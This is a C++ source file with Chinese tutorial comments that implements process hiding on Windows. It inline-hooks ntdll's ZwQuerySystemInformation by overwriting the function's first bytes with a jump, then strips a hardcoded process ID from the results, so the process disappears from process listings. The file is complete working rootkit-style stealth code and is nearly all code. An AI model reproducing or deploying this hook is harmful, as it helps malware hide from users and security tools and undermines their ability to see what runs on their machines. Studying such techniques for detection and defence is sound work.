#include "stdafx.h"
#include "HideProcess.h"


BYTE g_OldData32[5] = {0};
BYTE g_OldData64[12] = { 0 };

/*
Inline Hooke流程：
1.首先获取API函数的地址，可以从进程中获取hooke api对应的模块基址，这样就可以通过 GetProcAddress 函数获取 API函数在进程中的地址。
2.然后根据32位和64位版本，计算需要修改hook api函数的前几个字节数据。
3.若是32位系统，则需要计算跳转偏移，并修改函数的前5个字节数据（包含了汇编指令的字节长度），若是64位系统则需要修改函数的前12字节数据（包含了汇编指令的字节长度）。

4.接着修改API函数的前几字节数据的页面保护属性，更改为可读，可写，可执行，这样是为了确保修改后内存能够执行。
5.最后为了能够还原操作，要在修改数据前先对数据进行备份，然后再修改数据，并还原页面保护属性。
6.unhook 的流程基本上和 hook 的流程是一样的，只不过它写入的数据是 hook 操作备份的前几字节数据。这样，API函数便可以恢复正常。
*/
void HookApi()
{
	// 获取 ntdll.dll 的加载基址, 若没有则返回
	HMODULE hDll = ::GetModuleHandle("ntdll.dll");
	if (NULL == hDll)
	{
		return;
	}
	// 获取 ZwQuerySystemInformation 函数地址，函数作用：检索系统进程信息，从而找到我们想要隐藏的进程PID
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::GetProcAddress(hDll, "ZwQuerySystemInformation");
	if (NULL == ZwQuerySystemInformation)
	{
		return;
	}
	// 32 位下修改前 5 字节, 64 位下修改前 12 字节
#ifndef _WIN64
	// jmp New_ZwQuerySystemInformation
	// 机器码位：e9 _dwOffset(跳转偏移)	=>		1 + 4 = 5个字节
	//		addr1 --> jmp _dwNewAddress指令的下一条指令的地址，即eip的值
	//		addr2 --> 跳转地址的值，即_dwNewAddress的值
	//		跳转偏移 _dwOffset = addr2 - addr1
	BYTE pData[5] = { 0xe9, 0, 0, 0, 0};
	DWORD dwOffset = (DWORD)New_ZwQuerySystemInformation - (DWORD)ZwQuerySystemInformation - 5;
	::RtlCopyMemory(&pData[1], &dwOffset, sizeof(dwOffset));
	// 保存前 5 字节数据
	::RtlCopyMemory(g_OldData32, ZwQuerySystemInformation, sizeof(pData));
#else
	// mov rax,0x1122334455667788
	// jmp rax
	// 机器码是：
	//	48 b8 8877665544332211			=>		1 + 1 + 8 = 10个字节
	//	ff e0							=>		1 + 1 = 2个字节，所以总和为 12个字节
	BYTE pData[12] = {0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xe0};
	ULONGLONG ullOffset = (ULONGLONG)New_ZwQuerySystemInformation;
	::RtlCopyMemory(&pData[2], &ullOffset, sizeof(ullOffset));
	// 保存前 12 字节数据
	::RtlCopyMemory(g_OldData64, ZwQuerySystemInformation, sizeof(pData));
#endif
	// 设置页面的保护属性为 可读、可写、可执行
	DWORD dwOldProtect = 0;
	::VirtualProtect(ZwQuerySystemInformation, sizeof(pData), PAGE_EXECUTE_READWRITE, &dwOldProtect);
	// 修改
	//将源内存块的内容 pData 复制到目标内存块 ZwQuerySystemInformation
	::RtlCopyMemory(ZwQuerySystemInformation, pData, sizeof(pData));
	// 还原页面保护属性
	::VirtualProtect(ZwQuerySystemInformation, sizeof(pData), dwOldProtect, &dwOldProtect);

}


void UnhookApi()
{
	// 获取 ntdll.dll 的加载基址, 若没有则返回
	HMODULE hDll = ::GetModuleHandle("ntdll.dll");
	if (NULL == hDll)
	{
		return;
	}
	// 获取 ZwQuerySystemInformation 函数地址
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::GetProcAddress(hDll, "ZwQuerySystemInformation");
	if (NULL == ZwQuerySystemInformation)
	{
		return;
	}
	// 设置页面的保护属性为 可读、可写、可执行
	DWORD dwOldProtect = 0;
	::VirtualProtect(ZwQuerySystemInformation, 12, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	// 32 位下还原前 5 字节, 64 位下还原前 12 字节
#ifndef _WIN64
	// 还原
	::RtlCopyMemory(ZwQuerySystemInformation, g_OldData32, sizeof(g_OldData32));
#else
	// 还原
	::RtlCopyMemory(ZwQuerySystemInformation, g_OldData64, sizeof(g_OldData64));
#endif

	// 还原页面保护属性
	::VirtualProtect(ZwQuerySystemInformation, 12, dwOldProtect, &dwOldProtect);
}

/*
所执行的操作就是判断是否是检索系统的进程信息，若是则剔除隐藏进程的信息，将修改后的数据返回。
	首先使用 GetProcAddress 函数从 ntdll.dll 中获取 ZwQuerySystemInformation 函数地址并调用执行，检索并获取系统信息。
	接着判断检索消息类型是否是进程信息，若是则遍历检索结果，从中剔除隐藏进程的消息。
	最后数据修改完毕后，继续执行hook操作，并返回结果。
*/
NTSTATUS New_ZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	)
{
	NTSTATUS status = 0;
	PSYSTEM_PROCESS_INFORMATION pCur = NULL, pPrev = NULL;
	// 要隐藏的进程PID
	DWORD dwHideProcessId = 15416;

	// UNHOOK API
	UnhookApi();

	// 获取 ntdll.dll 的加载基址, 若没有则返回
	HMODULE hDll = ::GetModuleHandle("ntdll.dll");
	if (NULL == hDll)
	{
		return status;
	}
	// 获取 ZwQuerySystemInformation 函数地址
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::GetProcAddress(hDll, "ZwQuerySystemInformation");
	if (NULL == ZwQuerySystemInformation)
	{
		return status;
	}

	// 调用原函数 ZwQuerySystemInformation
	status = ZwQuerySystemInformation(SystemInformationClass, SystemInformation,
						SystemInformationLength, ReturnLength);
	if (NT_SUCCESS(status) && 5 == SystemInformationClass)
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		while (TRUE)
		{
			// 判断是否是要隐藏的进程PID
			if (dwHideProcessId == (DWORD)pCur->UniqueProcessId)
			{
				if (0 == pCur->NextEntryOffset)
				{
					pPrev->NextEntryOffset = 0;
				}
				else
				{
					pPrev->NextEntryOffset = pPrev->NextEntryOffset + pCur->NextEntryOffset;
				}
			}
			else
			{
				pPrev = pCur;
			}

			if (0 == pCur->NextEntryOffset)
			{
				break;
			}
			pCur = (PSYSTEM_PROCESS_INFORMATION)((BYTE *)pCur + pCur->NextEntryOffset);
		}
	}

	// HOOK API
	HookApi();

	return status;
}